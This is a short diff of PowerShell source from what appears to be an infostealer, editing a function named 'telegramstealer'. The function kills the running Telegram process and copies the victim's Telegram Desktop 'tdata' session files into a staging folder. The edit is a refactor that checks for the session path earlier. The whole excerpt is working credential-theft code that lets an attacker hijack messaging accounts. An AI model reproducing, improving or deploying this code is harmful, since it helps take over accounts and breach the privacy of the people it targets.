@@ -292,13 +292,14 @@ function Backup-Data {
 	# Telegram Session
     function telegramstealer {
 	$processname = "telegram"
+	$pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
+	if (!(Test-Path $pathtele)) { return }
 	$telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
     if ($telegramProcess) {$telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
     Stop-Process -Id $telegramPID -Force
     }
     $telegramsession = Join-Path $folder_messaging "Telegram"
 	New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
-    $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
     $items = Get-ChildItem -Path $pathtele
     foreach ($item in $items) {
     if ($item.GetType() -eq [System.IO.FileInfo]) {
